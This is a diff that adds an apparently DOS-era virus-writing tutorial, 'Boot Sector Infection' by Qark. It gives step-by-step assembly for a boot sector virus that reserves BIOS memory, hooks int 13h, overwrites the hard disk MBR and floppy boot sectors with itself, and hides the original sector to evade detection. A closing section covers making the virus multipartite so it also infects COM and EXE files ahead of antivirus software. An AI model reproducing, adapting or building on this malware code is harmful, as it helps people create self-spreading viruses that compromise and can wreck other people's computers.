@@ -1,0 +1,179 @@
+
+                        Boot Sector Infection                 
+                              by Qark
+ 
+
+ A lot of coders have difficulty taking the step from file infection to
+ boot sector infection.  The prospective coder is always scared of writing
+ to the harddisk with a direct Int 13h and confused by the technical
+ documentation.
+
+ There isn't much to know about boot sector infection really, and
+ it's actually easier than com infection once you know how to do it.
+
+ I'll demonstrate how to do infection later on but first there is some basic
+ technical information that is important to know:
+
+   On bootup Int 19h loads the boot sector into memory at 0:7C00h and
+   executes it at that position.  On entry to the code all registers are
+   set to any value (including SS:SP) except DL which points to the drive
+   being booted off (this is due to int 19h which needs a drive number when
+   it gets called).  Only BIOS interrupts may be called by the bootsector so
+   that gives you the vectors from 0-1F and some more obscure ones such as
+   int 76h.  The standard stack used by any boot sectors is 0:7C00 and you
+   should set your SS:SP to this on entry.
+  
+   Much useful data is located in the BIOS data segment, segment 40h. Because
+   of segmentation, it is convenient to address the data in the form
+   0000:04xx so that the interrupt table and code segment may addressed at
+   the same time.  The most important data in segment 40h for the virus
+   writer is the BIOS memory size located at 0:413h (40:13).  It indicates
+   the amount of conventional memory available on the computer in 1K (1024) 
+   units.  Interrupt 12h returns the value of this word in AX.
+  
+   All boot sectors, including DOS partitions, contain a 55AA marker as the
+   last word in the sector at offset 510 (1FEh).  It is necessary that this
+   is present if the sector is to be executed.
+
+   The hard disk MBR is located at sector 1, track 0, head 0 of drive C
+   (80h).  At offset 1BEh of the MBR is the partition table which is 64 bytes
+   long. When the virus is written to the harddisk MBR, it is important that
+   these 64 bytes are maintained in their position, or else the computer
+   can't be accessed if booting 'clean' from the disk drive.  Apart from the
+   first sector, which is used by the MBR, all of track 0 is free space to be
+   used by a virus as it wants.  Most boot sector viruses use this room, and
+   there is all the space a virus will require, as most harddisks have at
+   least a minimum of 16 sectors per track.  When the MBR executes it scans
+   the partition table for a bootable partition, it loads this sector in, and
+   executes it.  Thus it is possible to also infect the computers' DOS
+   partition boot sector, which would be done using the same method as a
+   floppy boot sector.
+
+
+ Basic Overview:
+
+        Set SS:SP to 0:7C00h
+        Lower BIOS memory allocation
+        Write virus into the free space in memory
+        Set int 13h to the virus int 13h handler
+        Call int 19h to exit
+
+ Int13handler Overview:
+
+        If it's not a read to the sector 1, head 0, track 0 then ignore.
+        Call the read.
+        If the buffer doesn't have the virus code then infect.
+        To stealth, read the original bootsector into buffer.
+
+ Infection Overview:
+
+        Write original boot sector elsewhere on the disk.
+        Write virus to the boot sector.
+
+  
+ In detail
+ ---------
+
+ Set SS:SP to 0:7C00 :
+                cli             ;disable interrupts
+                xor ax,ax
+                mov ss,ax
+                mov sp,7c00h
+                sti             ;enable interrupts
+  
+ Lower BIOS memory allocation:
+                dec word ptr [413h]    ;Memory less by 1K
+
+ Write virus into the free space in memory:
+                int 12h         ;memory into AX
+                mov cl,6        ;because memory is in K
+                shl ax,cl
+                mov es,ax       ;ES is the virus segment
+                mov cx,512      ;assume DS:SI points to virus start
+                rep movsb       ;move virus into its memory
+
+ Set int 13h to the virus int 13h handler:
+                mov si,13h*4
+                mov di,offset int13storage
+                movsw
+                movsw
+                mov word ptr [si-4],offset int13handler
+                mov word ptr [si-2],es
+
+ Call int 19h to exit:
+                int 19h         ;Will try to reload the virus sector, but
+                                ;stealth will redirect it to the original
+                                ;boot sector.
+
+ If it's not a read to the sector 1, head 0, track 0 then ignore:
+                cmp ah,2        ;read ?
+                jne exit_int13
+                cmp cx,1        ;sector 1, track 0 ?
+                jne exit_int13
+                or  dh,dh       ;head 0 ?
+                jnz exit_int13
+
+ Call the read:
+                pushf
+                call dword ptr cs:int13storage
+
+ If the buffer doesn't have the virus code then infect:
+                cmp word ptr es:[bx+offset marker],MarkerBytes
+                je  stealth_the_buffer_instead
+                ;infection code follows...
+
+ To stealth, read the original bootsector into buffer.
+               stealth_the_buffer_instead:
+                mov cx,2                ;stored original BS at sector 2
+                mov ax,201h
+                call orig_int13h
+
+ Write original boot sector elsewhere on the disk:
+                mov ax,301h
+                mov cx,2                ;store orig BS at sector 2
+                call orig_int13h
+
+ Write virus to the boot sector:
+
+                xor bx,bx               ;virus code is at offset 0
+                push cs
+                pop es
+                mov cx,1
+                mov ax,301h
+                call orig_int13h
+
+ In the code examples I have completely ignored floppy disk infection, but
+ good places to store the original boot sector on a disk are at the end of
+ the root directory (like stoned does) or reduce the size of the track
+ entry in the bootsector information, and place the virus in there.
+ Comparison between floppy/HD will often be necessary due to their different
+ structures.
+
+
+ Multipartitism
+ --------------
+
+ Multipartitism is where the virus not only infects boot sectors, but also
+ does COM, EXE or SYS files.  The hardest part of doing this is intercepting
+ the Int 21h vector.  If you hook too early the system will crash or not
+ be infected at all.  Too late and AV software will get in first and avoid
+ any stealth.
+
+ Methods:
+  The most common method is continuous checking of the start of the read
+  buffer for an 'MZ' because this will indicate the loading of an EXE file.
+  The computer will hang for anyone using QEMM (DOSDATA.SYS).
+
+  Hooking Int 10h and waiting for some call, such as a clear screen which
+  indicates program loading.
+
+  Using a counter, and grabbing int 21h after a period of time has elapsed.
+
+  Checking to see if an interrupt vector changes/points to a certain segment.
+  This won't work with QEMM (DOSDATA.SYS) either.
+
+ Grabbing Int 21h from a boot sector virus is difficult, and often
+ incompatible, but some viruses like junkie have been highly successful doing
+ this.
+
+
